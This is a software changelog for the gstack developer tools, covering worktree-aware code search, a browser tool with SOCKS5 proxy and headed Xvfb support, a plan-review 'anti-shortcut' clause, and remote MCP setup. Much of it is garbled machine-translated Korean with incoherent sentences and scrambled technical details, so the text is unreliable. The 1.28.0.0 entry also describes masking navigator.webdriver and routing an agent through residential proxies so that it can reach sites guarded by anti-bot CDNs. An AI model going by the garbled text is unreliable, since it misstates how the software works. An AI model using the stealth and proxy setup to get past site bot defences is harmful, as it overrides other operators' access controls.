- PR #1302는 생성된 `ship/SKILL.md`, 근원 `ship/SKILL.md.tmpl` 또는 `scripts/resolvers/review.ts`를 편집했습니다. 다음 `bun run gen:skill-docs`는 그것의 변화를 닦아 달라고 합니다; 파는 `fix(ship): port #1302 SKILL.md edits to .tmpl + resolver source`를 재생산의 변화를 유지하기 위하여 포함합니다.

## [1.29.0.0] - 2026-05-08

## **Code search beats Grep throughout each 도체 worktree 지금, 그냥 당신이 동기화 마지막 하나.**

`/sync-gbrain` registers each worktree as its own gbrain source, then runs `gbrain sources attach <id>` so the worktree gets a `.gbrain-source` pin in its root. Subsequent `gbrain code-def`, `code-refs`, `code-callers` calls from anywhere under the worktree route to that source by default, no `--source` flag needed. Conductor sibling worktrees of the same repo no longer collide on a shared `gstack-code-<slug>` source ID, so the last `/sync-gbrain` run no longer silently overwrites every other worktree's index.

`/codex`의 조언자 검토에 의해 표면이 세 가지 교정 버그는 `/ship`의 동일한 릴리스에서 고정됩니다. 침묵 부착 실패 (동작 성공하지만 핀은 누락되지 않은 `code-def` 잘못된 소스를 보였습니다), preamble inconsistency (스타트업 hint는 글로벌 상태에 따라 "indexed"를 주장, ignoring per-worktree 핀), orphan 소스 누출 (이전의 경우 `gstack-code-<slug>`의 원본은 세 가지 수정 된 검색을 위해, 모든 교차 자원에 대한 검색을 완료합니다.

### 중요 한 숫자

`bun test test/gstack-gbrain-sync.test.ts test/gbrain-sources.test.ts test/gen-skill-docs.test.ts`를 통해 확인된 최후에:

| Surface | 의 전 | 후지후 | Δ |
|---|---|---|---|
| 지휘자 worktrees는 자주적으로 색인했습니다 | 1 (마지막 동기화-wins) | N (편도 당 1 소스) | 분기별 |
| `gbrain code-def` sync 없이 worktree에서 | 관련된 태그 | default로 돌아와서 공지 사항 | no 침묵하는 corruption |
| Orphan 소스는 실행 중 축적 | 의논하기 | 0 (일부 id가 첫 번째 새로운 형식 동기화에 제거) | clean |
| 첨부 파일-failure-to-pin 동작 | 단계 보고서 `ok:true` | 단계 보고서 `ok:false` 이유 | no 침묵하는 정정 틈 |
| Orchestrator 등록 논리 | `bin/` 및 `lib/` (하나 경로에 `--db`를 놓습니다) | `lib/gbrain-sources.ts`의 진리의 단일 소스 | DRY |
| Required gbrain 버전 | v0.20.0+ (단 하나 마진 전용) | v0.30.0+ (`sources attach`를 사용하십시오) | 관련 제품 |

테스트 카운트는 405 → 408 (+3 worktree-aware test + 1 레거시-cleanup 미리보기 테스트)에서 갔다.

### 이 빌더를 위한 뜻

If you use Conductor to run multiple parallel branches of the same repo, you can now run `/sync-gbrain` in each one and `gbrain code-def` from inside any of them returns hits from THAT worktree's branch state, not whichever sibling synced most recently. This was a hard requirement before semantic code search could replace Grep for refactor planning, "where is X used", "what depends on what" queries across parallel worktrees. Run `gbrain autopilot --install` once per machine for ongoing background sync; gbrain는 daemon 수명주기를 소유합니다.

### 항목화 된 변경

#### 추가

- `bin/gstack-gbrain-sync.ts:176-186`의 워크 트리 아웨어 소스 ID. 패턴은 `pathhash8`가 `sha1(absolute repo path)`의 첫 번째 8 헥스 숯입니다. 같은 origin의 지휘자 워크 트리는 1 gbrain DB에 별도의 소스로 공동창작합니다.
- `gbrain sources attach <id>` 단계 `runCodeImport` (`bin/gstack-gbrain-sync.ts:336-351`). sync가 성공한 후에 worktree 뿌리에서 `.gbrain-source <id>`를 쓰고십시오; 그 근원에 어떤 subdirectory 자동 노선에서 그 후에 후에 후에 후에 후에 그 자리수십시오.
- Legacy source cleanup: on first new-format sync, removes the pre-pathhash `gstack-code-<slug>` orphan via `gbrain sources remove ... --confirm-destructive` (`bin/gstack-gbrain-sync.ts:298-318`).
- `.gbrain-source` `.gitignore`에 추가해 이렇게 per-worktree 핀은 branch의 맞은편에 누출하지 않습니다.

#### 변경

- Code Stage no는 리모트 MCP (Path 4)에 더 이상 건너 뛰었습니다. `sync-gbrain/SKILL.md.tmpl`의 초기 결과는 관현관 ran의 앞에 사용자를 끓였습니다. artifacts가 원격 MCP를 사용하는지 여부에 관계없이 로컬 코드 뇌가 작동합니다. 모델에 설명하는 쪼개는 엔진 prose와 대체하십시오.
- 소스 등록은 이제 `lib/gbrain-sources.ts:ensureSourceRegistered`을 통해서만 흐름합니다. 오케스트라 이진에서 `ensureSourceRegisteredSync`를 삭제했습니다. `lib/gbrain-sources.ts:100`의 lib  helper의 근사한 방식을 옮긴 후, `--db` 또는 `--federated`를 건너뛰는 미사일드 플랩 위험을 제거하십시오.
- 스타트업 프리아블 (`scripts/resolvers/preamble/generate-brain-sync-block.ts:48-75`)은 `git rev-parse --show-toplevel`의 `.gbrain-source`를 체크하며, 글로벌 `~/.gstack/.gbrain-sync-state.json`가 아닙니다. 동기화되지 않은 워크 트리 no를 열어서 sibling의 동기화를 기반으로 "indexed"를 주장합니다.
- CLAUDE.md 지도 블록 SKILL 템플릿은 이제 `.gbrain-source` 핀과 `gbrain autopilot --install`를 연속 동기화합니다.

#### 고정

- 침묵하는 부착 실패: `gbrain sources attach`는 지금 단계 실패로 비 zero를 돌려보내어 달라고 했습니다. 이전에는 핀이 누락된 동안 `ok:true`를 보고했습니다, 그래서 비례적으로 default 근원을 명중했습니다 default를 명중했습니다. 이제는 verdict 구획에 있는 이유를 가진 ERR를 표면으로 합니다; 사용자는 재참고를 알고 있습니다.
- 잘못된 층 경로 4 초기에 (`/codex` #2를 `/plan-eng-review`에서 찾는).
- Orphan 소스 축적: pre-pathhash `gstack-code-<slug>` 소스는 `/sync-gbrain`를 통해 등록되어, 출하된 경로 키 포맷 후도 실행, 오염된 `gbrain search` stale duplicates 결과.

#### 기여자

- Phase 0 verification spike at `~/.gstack/projects/garrytan-gstack/2026-05-08-gbrain-split-engine-spike.md` documents what gbrain v0.30 actually provides (no `--db` flag, `serve --http` requires postgres, `sources attach` is the v0.30 routing primitive). The approved plan's "per-worktree PGLite + per-worktree HTTP serve" architecture was invalidated by the spike; the simpler "one brain, many sources, attach for CWD pin" model collapsed ~80% of the plan's complexity.
- `/codex`는 `/ship` 도중 옹호자 검토를 붙잡았습니다 (실린 부착, 접대성, orphan 누출) 병합하기 전에. 찾기 cost: ~10 분 CC. 생산 벌레 옥수수: stale 코드는 "대부분 일하는"를 검색 결과 — 벌레에 최악의 종류를 보여줍니다.
- gbrain CLI 최소 버전은 v0.30.0 (v0.20.x에 존재하지 않는 `sources attach`를 사용합니다). `cd ~/git/gbrain && git pull && bun install && bun link`를 업그레이드하십시오.

## [1.28.0.0] - 2026-05-07

## **검색은 현재 실제 자동화를 처리합니다: SOCKS5 와 auth, 컨테이너 Xvfb, 브라우저 중립 다운로드. 단일 파일 `llms.txt` 인덱스 에이전트는 하나 읽을 수 있습니다.**

PR 중 5개의 기능 선박. `--proxy` (이형 SOCKS5 교량과 더불어) Chromium는 정통 상류에 그것을 말할 수 없습니다 본래로 말하지 않는), `--headed` (Linux 콘테이너에 자동 천막 Xvfb에 DISPLAY), `download --navigate` (작성 분해를 위한 브라우저의 기본 다운로드 핸들러를 사용, CDN (진공에 놓는) CDN 사슬을 가진 다발성 CDN 콘테이너. 스텔스는 `navigator.webdriver` 마스킹에만 좁혀져 있습니다. 현대 지문인들은 불면증이 없는 가짜를 벌고, 그래서 플러그인을 파는 /languages는 더 쉬운 탐지를 하고, 더 열심히 하지 않았습니다. 그리고 `gstack/llms.txt`는 이제 모든 SKILL.md와 동일한 소스에서 자동 생성됩니다. 그래서 `llms.txt` 부츠를 전체 표면으로 읽는 어떤 에이전트 (47 기술, 75 검색 명령)을 원치에서 읽습니다.

### 중요 한 숫자

`bun test browse/test/{socks-bridge,proxy-config,proxy-redact,xvfb,stealth-webdriver,bridge-chromium-e2e}.test.ts test/llms-txt-shape.test.ts`를 통해 확인된 최후에:

| Surface | 의 전 | 후지후 | Δ |
|---|---|---|---|
| `browse --proxy` (auth) | 지원되지 않음 | 작업 종료 | 새로운 기능 |
| `browse --headed` DISPLAY 없이 Linux | 지원되지 않음 | 자동 Xvfb 첫 번째 무료 디스플레이 | 새로운 기능 |
| `download --navigate` (브라우저-native) | only `page.request.fetch()` | 다운로드 경로 추가 | 새로운 기능 |
| `gstack/llms.txt` 에이전트에 대한 인덱스 | none | 47 기술 + 75 11KB의 명령 | 새로운 기능 |
| 브리지 PID 검증 방어 | n/a | `/proc/<pid>/cmdline` AND 시작 시간 | 전체 안전 |
| proxy + headed + 탐색을 덮는 테스트 | 0 | 7개의 파일에 70+ 시험 | 0에서 포괄적인 |

`bridge-chromium-e2e.test.ts`는 실제로 기능을 증명하는 것은 한개입니다: 진짜 Chromium는 `proxy.server = socks5://127.0.0.1:<bridgePort>`로 발사하고, 국부적으로 HTTP 정착물에 탐색하고, 우리는 auth 상류의 연결 카운터 및 HTTP 정착물의 명중 둘 다 증가를 주장합니다. 그 시험 없이 우리는 일 바이트 지연을 발송할 수 있었습니다 및 부서지는 Chromium 통합 및 결코 고시하지 않았습니다.

### AI 에이전트을 위한 이 의미는 무엇입니까

모든 프로젝트에 대한 모든 에이전트는 이제 모든 사이트를 명중 할 수 있습니다. auth-required 주거 SOCKS5 → `browse --proxy socks5://user:pass@host:1080 --headed download <url> /tmp/file --navigate` 및 파일 토지의 뒤에 DDoS-Guard'd CDN. Linux → `--headed` 자동 스팸 Xvfb, no 수동 설정. `llms.txt` 인덱스는 하나 그림 작업 발견을합니다. 에이전트는 47 SKILL.md 파일을 스캔하고 먼저 기술에 시작을 시작합니다.

### 항목화 된 변경

#### 추가
- `browse --proxy <url>` 플래그. SOCKS5를 사용자 이름과 지원/password
  auth, HTTP, HTTPS. SOCKS5+auth는 임베디드 로컬 브리지를 통해 실행합니다 (`browse/src/socks-bridge.ts`, ~250 LOC)는 ephemeral 항구에 127.0.0.1에 경계합니다. 교량은 SOCKS5 auth handhake를 이렇게 취급합니다 Chromium (SOCKS5 주름을 잡을 수 없는)는 아직도 정통 상류를 사용할 수 있습니다.
- `testUpstream()`가 Chromium가 시작되기 전에 미리 Flight `testUpstream()`가 시작됩니다: 총 5개
  예산, 500ms 백 오프 (손 VPN 워밍업 레이스)와 3 개의 리트리. 실패시, 1을 적격 오류 메시지로 종료 - no 첫 번째 탐색에 "연결 거부" 혼란.
- `browse --headed` 리눅스에서 자동 Xvfb를 가진 깃발. 전시를 도보
  범위 (`:99`, `:100`, ...) 까지 `xdpyinfo` 무료 말한다; 절대 하드 코드 `:99` 그리고 결코 그것을 만들지 않은 디스플레이를 위해 `/tmp/.X<n>-lock`. Xvfb 아이 PID + 시작 시간 + 디스플레이 `~/.gstack/browse.json`에서 기록 된 그래서 정리에 disconnect는 신호하기 전에 소유권을 유효하게 할 수 있습니다. `WAYLAND_DISPLAY`가 설정되면 스패드를 건너 뛰십시오 (Chromium는 기본적으로 방법.
- `download --navigate` 플래그 (복합 PR #1355, attribution 보존).
  `page.waitForEvent('download')` 과 `page.goto(url, { waitUntil: 'commit' })` 대신 `page.request.fetch()`를 사용합니다. 다운로드가 브라우저 내비게이션(Content-Disposition 헤더, 리디렉션 체인, 안티봇 CDN)에 의해 트리거되는 사이트에 필요한 경우.
- `gstack/llms.txt` 기술 frontmatter와 자동 생성
  `COMMAND_DESCRIPTIONS` 레지스트리를 찾아보세요. `bun run gen:skill-docs`마다 재생합니다. 엄격한 모드(테스트에서 사용)는 프론트 매트러에서 어떤 기술이 누락된 `name` 또는 `description`를 거부합니다.

#### 변경
- `navigator.webdriver`로 축소된 스텔스.
  `launchHeaded` 패치는 `navigator.plugins`와 `navigator.languages`가 현대 지문인식이 `userAgent`/ `platform`와 견실함을 확인하기 때문에 가짜 `navigator.plugins`와 MORE 봇과 같은 고정 값을 매길 수 있는 콤포넌트를, 더 적은 수 있다는 것을 미리 확립했습니다. cdc_/__webdriver 런타임정 및 권한 API 패치는 유지됩니다 — 그 제거 ChromeDriver-injected artifactize 자연적 가치 보다는 오히려 자연적인 가치.
- daemon를 찾아서 `--proxy`/`--headed`를 자동으로 재시작할 수 없습니다.
  flag mismatch. config A + new invocation 와 config B → 종료 1 와 `browse disconnect` 힌트. No 침묵 상태 손실.
- 주름 정책 : BOTH에서 주름을 전달 URL와 `BROWSE_PROXY_USER`/
  `BROWSE_PROXY_PASS` env vars는 이제 명확한 오류로 빠르게 실패합니다. 침묵하는 override는 디버깅 트랩이었습니다.

#### 고정
- N/A — 새로운 코드 경로.

#### 기여자
- 새로운 단위 경계: `browse/src/socks-bridge.ts`,
  `browse/src/proxy-config.ts`, `browse/src/proxy-redact.ts`, `browse/src/xvfb.ts`, `browse/src/stealth.ts`. 각각은 고립에서 작고, 시험할 수 있고, `*.test.ts` 적용을 일치했습니다.
- 70+ 7개의 파일에 대한 새로운 테스트. `bridge-chromium-e2e.test.ts`
  테스트는 브리지를 통해 실제 Chromium를 시작하고 요청을 실제로 추적 (위스트 스트림은 카운터 + HTTP 정착물은 증가 둘 다 반대를 명중합니다).
- `socks` npm 의존성 추가 (~30KB).
- Xvfb + x11-utils `.github/docker/Dockerfile.ci`에 추가했습니다.
  `headed-xvfb`/`headed-orphan-cleanup`는 Linux 컨테이너 경로에 CI만 수동 연기 테스트 대신 실행합니다.
- @garrytan-agents에서 PR #1355가 합병; attribution
  수력에 보존.

## [1.27.1.0] - 2026-05-06

## **계획 모드 리뷰는 이제 요청없이 덤프 찾기를 거부합니다. 4 게이트 계층 테스트는 모든 PR에 회귀를 잡습니다.**

`/plan-*-review` 기술 (eng, ceo, 디자인, devex)는 단일 공유 된 결실을 통해 구운 항단 절을 얻습니다. 이 절은 5 월 2026 성적표가 직접 실패 모드를 지명합니다. 모델은 탐구, 문제 찾기, 한 계획 쓰기로 모든 발견, AskUserQuestion없이 ExitPlanMode 호출합니다. 새로운 절은 반복적 인 영향을 미칩니다. "계획 파일은 대화형 검토의 OUTPUT이며, 대체가 아닙니다." 미래의 조준은 다음 gen-skill-docs에서 4개의 기술 업데이트를 편집합니다.

4개의 문 층 E2E 시험은 4개의 템플렛, 공유한 결심자, 또는 씨 정착물을 접촉하는 각 PR에 회귀 종류를 붙잡습니다. 각 시험은 작은 “포장 찾는”씨에 대하여 일치 기술 및 주장합니다 에이전트 불을 계획_ready를 도달하기 전에 적어도 1 AskUserQuestion를 점화합니다. 시험 당 ~1-3 분 벽 시간, ~$2-6 합계 CI 당 CI 명중. CEO는 모두를 통과합니다. 새로운 4개의 템플렛. 4개의 템플렛은 4개의 템플렛에 대하여 새롭습니다.

### 중요 한 숫자

실제 PTY를 통해 검증된 엔드 투 엔드는 `claude` 계획 형태에 대하여 뛰습니다:

| Surface | 의 전 | 후지후 | Δ |
|---|---|---|---|
| 안티-shortcut 항목과 계획 모드 리뷰 | 0/4 | 4/4 | 플랜* 가족의 전체 적용 |
| 성적표 - bug 클래스의 Gate-tier 회귀 테스트 | 0 | 4 | 1개의 기술 |
| 바닥 테스트 당 벽 시간 (일반) | n/a | 30s-3m의 | 첫 번째 AUQ 렌더링 초기 출구 |
| 게이트 런당 비용 (무선이 발생하면) | n/a | ~$2-6 | diff-gated; 관련 편집에 불만 |
| 추가/ 삭제 | — | +450 / −3 | 첨가물; no 끊는 변화 |

바닥 테스트는 첫 번째 비 배출 번호 인 옵션 렌더링에서 출구를 나타내는 집중 관찰자 (`runPlanSkillFloorCheck`)를 사용합니다. 기존의 정기적인 인사이트 검사 사용 `runPlanSkillCounting` 25 분 예산에 전체 지문 분석; 바닥 변형은 초기 신뢰성을위한 지문 정밀도를 무역하므로 게이트 층 제약을 적합합니다. 두 도움 모두 `test/helpers/claude-pty-runner.ts`에서 측면을 살 수 있습니다.

### 이 4개의 검토 기술을 의미하는 것

모든 계획-* 리뷰는 이제 정확한 실패 모드에 대한 구조적 규칙이 전시되었습니다. 반대로 단락 절은 기존의 안티 스키 규칙 후 바로 렌더링 된 프롬프트에 나타납니다. 따라서 per-section STOP gates v1.26.2.0이 이미 추가되었습니다. 미래의 모델이 버그를 수정하면, 게이트 층 테스트가 다음 PR에 전체 PTY 증거로 불을 얻습니다.

### 항목화 된 변경

#### 추가
- **`generateAntiShortcutClause` 해결자** `scripts/resolvers/review.ts`,
  registered as `{{ANTI_SHORTCUT_CLAUSE}}` in the `RESOLVERS` map. Plan-* SKILL.md.tmpl files include it via one placeholder line.
- **`runPlanSkillFloorCheck` PTY 연구원** 에서
  `test/helpers/claude-pty-runner.ts` - 최소 "제임 불 ANY AskUserQuestion?" 첫 번째 비 배출 번호가 없는 옵션 렌더링에 이른 출구와 관찰자.
- **4개의 문 층 찾는 지면 E2E 시험** 에서
  `test/skill-e2e-plan-{eng,ceo,design,devex}-finding-floor.test.ts`, 공유 `runPlanSkillFloorCheck` 돕기 사용 각각.
- **4개의 forcing-finding씨** `test/fixtures/forcing-finding-seeds.ts`,
  기술 당 하나, 각은 그 기술의 검토 초점의 밑에 적어도 1개의 발견에 디자인했습니다.

#### 변경
- **모든 4 `plan-*-review` SKILL.md** 파일이 포함되어 있습니다.
  `**Anti-skip rule:**` 단락 후 즉시 반대로 단락. 단락 (지하에 두지 않음)에 닻을 etc로 그들의 다른 단면도 상표에 관계 없이 모든 4개의 템플렛의 맞은편에 동일 삽입 일.
- **`test/helpers/touchfiles.ts`** 4개의 항목을 `E2E_TOUCHFILES`에 추가합니다.
  그리고 `E2E_TIERS=gate`. 새로운 항목은 일치 기술 템플릿, 공유 된 해결자, 씨앗 고정 및 PTY 주자 돕기에 따라 달라집니다.
- **`test/touchfiles.test.ts`** 조사 assertion는 21→22를 가진 범람했습니다
  `plan-ceo-finding-floor`의 적정한 배열.

## [1.27.0.0] - 2026-05-06

## **`/setup-gbrain`는 1개의 풀에 있는 먼 뇌에 연결합니다. 뇌 repo는 gstack-artifacts로 이름을 딴.**

`/setup-gbrain`는 이제 네 번째 경로가 있습니다. MCP URL plus bearer token, 그리고 기술은 로컬 두뇌 DB를 제공하지 않고 gbrain MCP로 등록합니다. No PGLite to install, no Supabase 프로젝트가 설정되었습니다. 이미 다른 곳에서 실행되는 두뇌에서 이 맥을 포인트로 가리키십시오 (Tailscale node, ngrok, LAN, LAN, Supabase 프로젝트가 시작된 그룹을 검색합니다. 선택적으로 동일한 흐름은 GitHub OR GitLab에서 개인 `gstack-artifacts-$USER` repo OR를 규정하므로 원격 뇌는 CEO 계획, 디자인 및 보고서를 federated 소스로 섭취할 수 있습니다. repo는 `gstack-brain-$USER`를 더 명확한 이름으로 바꾸고, 기존 사용자는 GitHub repo를 처리하는 저널, 중단 안전 마이그레이션을 얻습니다. GitHub repo는 no를 다시 바꾸고, 겹침입된 파일에, 겹침입된 파일로 이동합니다.

### 중요 한 숫자

검증된 라이브 리모드 뇌에 대한 엔드 투 엔드 (Slidscale, gbrain v0.27.1, 96K 페이지에 대한 장기) 새로운 테스트 스위트:

| Surface | 의 전 | 후지후 | Δ |
|---|---|---|---|
| `/setup-gbrain` 경로 | 3 (Supabase/PGLite/스위치) | 4 (Supabase/PGLite/스위치/ 리모트 MCP) | +1 경로, no 로컬 설치 필요 |
| 원격 MCP를 일하는 시간 | 수동 `claude mcp add --transport http`, 그 다음 기술의 나머지를 건너 | 한 경로 4 연습, 전체 검증 + artifact-repo 제공 | ~30 SEC 설정, 에이전트 가이드 |
| 실패 모드를 검증 | none (급강한 컬 과실) | NETWORK / AUTH / MALFORMED, 1라인 재약 힌트 각각 | 3개의 물통, 0개의 틀린 층 debugging |
| Migration 중단 안전 | Ctrl-C에 부분 상태 | `.migrations/v1.27.0.0.journal`의 저널은 다음의 un-done 단계에서 재개합니다. | 6단계 원자 롤백 |
| 이름 blast 반경 | 1개의 bin 스크립트 | bin + scripts/ + 8 생성된 SKILL.md 표면 | grep 회귀 시험은 모든 촉구를 감시합니다 |
| 시험 추가 | — | 59 단위 + 2 문 층 E2E + 4 회귀 | 이름의 전체 범위 + 경로 4 번 계약 |

| 경로 4 단계 | 런닝 | 지역 의존성 |
|---|---|---|
| 4c 인증 | `gstack-gbrain-mcp-verify $URL` (curl POST 초기화) | none |
| 단계 5a 등록 | `claude mcp add --scope user --transport http gbrain $URL --header "Authorization: Bearer $TOKEN"` | claude CLI |
| 7 단계 | `gstack-artifacts-init` (gh OR glab OR 수동 URL 풀) | gh/glab/git의 |
| Step 8 CLAUDE.md | 모드 인식 블록; token NEVER CLAUDE.md (`~/.claude.json`만)에 기록된 | 파일시스템 |
| 단계 9 연기 시험 | 포스트-restart 수동 검증을 위해 curl-equivalent 인쇄 | none |

검증된 헬퍼의 `Accept: application/json, text/event-stream` 요구 사항은 회귀 테스트 된 invariant입니다. HTTP 전송이 406을 반환하지 않는 모든 MCP 서버는 두 값없이 허용되지 않습니다. 이 헤더는 신선한 설정 당 디버깅의 약 10 분의 비용이 떨어졌습니다.

### 이 수단은 기계의 gbrain을 실행하는

If you have a brain on a different Mac, a Tailscale-connected server, or a teammate runs one for the team, you no longer need a local install on every client. One paste of URL + bearer registers the MCP at user scope; restart Claude Code and `mcp__gbrain__search` and friends become callable. The artifacts repo is per-user (private), so each developer pushes their own plans/designs/reports without crossing trust surfaces. `gstack-brain-$USER`를 `gstack-artifacts-$USER`로 바꾸는 것은 당신이 이동 신속한 받아들이는 경우에 자동적입니다; 당신이 쇠퇴하면 모든 일은 지킵니다.

로컬 모드 사용자 (PGLite 또는 Supabase)를 기존의 이름을 넘어 no 동작 변경을 참조하십시오. `/setup-gbrain` 2 단계에서 선택된 경로는 새로운 "artifacts" 용어로 끝나는 것입니다.

### 항목화 된 변경

#### 추가

- **`/setup-gbrain` 경로 4 (레모드 MCP).** 2 단계는 4 번째 옵션을 얻습니다.
  paste an HTTPS MCP URL plus a bearer token. The skill verifies via `gstack-gbrain-mcp-verify` (NETWORK / AUTH / MALFORMED classifier with one-line remediation hints), registers via `claude mcp add --scope user --transport http gbrain --header "Authorization: Bearer ..."`, then skips local install / doctor / transcript ingest because Path 4 has no local dependencies. Steps 5, 5a, 7, 8, 9, 10 all branch on mode. Idempotent re-run skips Step 2 entirely when `gbrain_mcp_mode=remote-http` is already detected.
- **`bin/gstack-gbrain-mcp-verify`** (새로운). 원격으로 POSTs `initialize`
  MCP URL `$GBRAIN_MCP_TOKEN` (never argv)의 붕대와 NETWORK/ AUTH/ MALFORMED로 강제로 실패를 분류합니다. 앞으로 gbrain 방출을 위한 조사 `tools/list` (`sources_add_url_supported: true|false`를 반전하십시오).
- **`bin/gstack-artifacts-init`** (새로운). `gstack-brain-init`를 대체합니다. 요청
  GitHub (auto via `gh`), GitLab (auto via `glab`), 또는 수동 URL 풀을 골라내십시오. `gstack-artifacts-$USER` (private)를 창조하고 HTTPS URL를 `~/.gstack-artifacts-remote.txt`에서 저장하고, 뇌 배드 후크 명령을 "당신의 뇌 관리에 이것을 보내십시오" (알바로 인쇄, 결코 자동 배드 - 왜 `setup-gbrain/memory.md`를 위해 `setup-gbrain/memory.md`를 참조하십시오).
- **`bin/gstack-artifacts-url`** (새로운). HTTPS↔SSH를 위한 작은 돕는 사람
  변환 플러스 호스트 / 소유자-repo 추출. `gstack-slug`의 정신을 미러링 그래서 URL-format string-mangling 생명을 한 곳에서.
- **`gbrain_mcp_mode` 필드는 `gstack-gbrain-detect` 출력입니다.** 3 층
  fallback: `claude mcp get gbrain --json` → `claude mcp list` text-grep → `~/.claude.json` jq read. 방어력: Anthropic가 파일 형식을 이동하면, 첫 번째 2 계층은 그것을 흡수합니다.
- **`gstack-upgrade/migrations/v1.27.0.0.sh`**. 6단계 전사
  뇌 → artifacts 이름에 대 한. 각 단계는 `~/.gstack/.migrations/v1.27.0.0.journal` 성공에 그것의 이름을 쓰기; 다음 un-done 단계에서 재입력. 최종 성공에, 저널은 `v1.27.0.0.done`로 대체 됩니다. 사용자 선택은 `skipped-by-user` 마커를 쓰기 그래서 프롬프트는 다시 불을 `/setup-gbrain --rerun-migration`까지.
- **`setup-gbrain/memory.md`**에는 새로운 “Path 4: 먼 MCP 체제”가 있습니다
  Bearer Storage 거래 오프를 다루는 섹션, 항상 인쇄 뇌 - 배드 후크 패턴, CLAUDE.md 블록 형식 (no token) 및 토큰 회전 안내.

#### 변경

- **`gbrain_sync_mode` config 키가 `artifacts_sync_mode`로 이름을 변경했습니다.** 하드
  이름, no 듀얼레드 별명으로. 마이그레이션 스크립트는 `~/.gstack/config.yaml`의 키를 다시 작성하고 GBrain의 구성"은 CLAUDE.md의 블록을 "# GBrain. 내부 통화 업데이트 : `bin/gstack-config`, `bin/gstack-gbrain-detect`, `bin/gstack-brain-sync`, `bin/gstack-brain-enqueue`, `bin/gstack-brain-uninstall`, `bin/gstack-timeline-log`, `scripts/resolvers/preamble/generate-brain-sync-block.ts`.
- **`BRAIN_SYNC: ...` 라인은 `ARTIFACTS_SYNC: ...`로 이름을 변경했습니다.**와
  `gbrain_mcp_mode`에 branch. 원격 http 모드에서는 로컬 동기화가 디자인에 의해 no-op이 아닌지 명확하게하기 위해 `ARTIFACTS_SYNC: remote-mode (managed by brain server <host>)`를 방출합니다.
- **`bin/gstack-brain-restore`, `bin/gstack-gbrain-source-wireup`, and
  `bin/gstack-brain-uninstall`** `~/.gstack-artifacts-remote.txt` 와 `~/.gstack-brain-remote.txt` 와 이동 창 fallback 을 읽습니다. v1.27.0.0 마이그레이션이 실행되면, artifacts 파일만 남아 있습니다.
- **`/sync-gbrain`는 리모트http 형태에 있는 우아한 no-op입니다** (V1). 인쇄
  뇌 서버에서 원라인 노트를 점유하고 깨끗하게 종료합니다. 로컬 모드 사용자는 no 변경을 참조하십시오.

#### 제거

- **`bin/gstack-brain-init` 삭제.** `bin/gstack-artifacts-init`로 대체.
  언젠가 이전 이름 포스트 업그레이드를 실행하는 것은 깨끗한 "찾지 못했습니다" 오히려 침묵 이름보다 - 당 gstack 규칙 "보이드 백그라운드 호환성 해킹." 디스크에 기존 사용자는 v1.27.0.0.sh에 의해 마이그레이션.
- **`test/gstack-brain-init-gh-mock.test.ts` 삭제.** 에 의해 대체하는
  `test/gstack-artifacts-init.test.ts` 같은 gh-mock 패턴을 커버하고 새로운 GitLab branch와 뇌 - 배드 프린트 아웃.

#### 기여자

- **59개의 새로운 단위 시험 + 2개의 문 층 E2E 시험 + 4 회귀 시험.**
  주요 특징:
  - `test/gstack-gbrain-mcp-verify.test.ts` (13개의 시험)는 각 과실을 덮습니다
    class via mocked curl, asserts the dual `Accept` header is set on
    모든 통화, 회귀 테스트 토큰 - never-on-stdout invariant.
  - `test/gstack-artifacts-init.test.ts` (16의 시험)는 gh/glab/를 덮습니다
    둘 다/공급자 선택, HTTPS canonical 저장, 뇌 배드 프린트아웃에서 URL-form-supported branch, 그리고 idempotent 재 실행.
  - `test/gstack-gbrain-detect-mcp-mode.test.ts` (19의 시험)는 각각을 verifies
    isolation에 3개의 탐지 층의, 플러스 schema 회귀는 `/sync-gbrain`의 패서저가 새로운 분야에 끊지 않습니다.
  - `test/migrations-v1.27.0.0.test.ts` (11개의 시험)는 6개의 모든 것을 포함합니다
    저널 이력서, idempotent 재 실행, 소스 스왑에 대한 추가 - 대 - 레모브 주문, 및 원격 -MCP 인쇄 전용 지점.
  - `test/no-stale-gstack-brain-refs.test.ts` 더 넓은 나무를 꽉 뿌린다
    (빈, 스크립트, *.tmpl, 생성*.md, test/) 의 stale 식별자.
  - `test/post-rename-doc-regen.test.ts`는 gen-skill-docs 산출을 확인합니다
    no `gstack-brain` 문자열이 있습니다.
  - `test/setup-gbrain-path4-structure.test.ts`는 빠른 구조상 lint입니다
    AUQ-Pacing regressions in the Path 4 prose in a eval token을 지출하지 않고.
- **`scripts/resolvers/preamble/generate-brain-sync-block.ts`** 검출
  `~/.claude.json`를 직접 읽는 먼http 형태 (no 각 preamble에 claude subprocess — 뜨거운 경로는 빨리 체재합니다).
- **`test/helpers/touchfiles.ts`** 철사 `setup-gbrain-remote`와
  `setup-gbrain-bad-token` 게이트 층 E2E 선택.
- **35K에서 36.5K로 빙정된 byte 예산**를 경청하기 위하여
  `generate-brain-sync-block.ts`의 먼 형태 probe.

## [1.26.5.0] - 2026-05-06

## **v1.26 메모리 기능은 이제는 실제로 신선한 `/setup-gbrain` 설치 및 `/sync-gbrain --full`를 사용하며 실제로 github-hosted 코드 소스를 등록합니다.**

두 가지 수정 파 버그는 하나의 배로 닫힙니다. 이 버전까지, 헤드 라인 v1.26 기능 종료 설정 녹색하지만 아무것도하지 않았다: 모든 성적표 페이지 실패 `Unknown command: put_page`, 모든 `github.com/<org>/<repo>` repo는 잘못된 소스 ID에 대한 거부를 얻었다. 업그레이드 후, title/type/tags intact, 그리고 어떤 github-hosted repo 코드 소스를 사용하여 gbrain에서 추출한 성적표 땅을 제거.

### 중요 한 숫자

두 숫자는 실제 gbrain v0.25.1에 대한 바이너리를 실행에서 온다, 이 기계에 설치, `origin/main` 첫째 (버지)와 합병 branch 두 번째.

| Surface | (v1.26.4.0) 이전 | (v1.26.5.0) 후에 | Δ |
|---|---|---|---|
| Memory-ingest 작가 동사 | `gbrain put_page --slug ... --title ...` (CLI 거부: `Unknown command`) | `gbrain put <slug>` frontmatter (CLI는 받아들입니다) | 100%에서 0% 실패 |
| title/type/tags를 가진 Transcript 페이지 | none - 필드 로드 CLI 플래그는 no gbrain 버전이 허용됩니다. | 모든 페이지에 기존 frontmatter에 주입 | /filter by `--type transcript` 실제로 결과를 반환 |
| `github.com/garrytan/gstack`에 파생된 소스 ID | `gstack-code-github.com-garrytan-gstack` (38개의 숯은, `.`를, 실패합니다 gbrain `[a-z0-9-]{1,32}` validator)를 포함합니다 | `gstack-code-garrytan-gstack` (27개 숯, 유효) | github-hosted 저장소의 100 %는 허용 거부 |
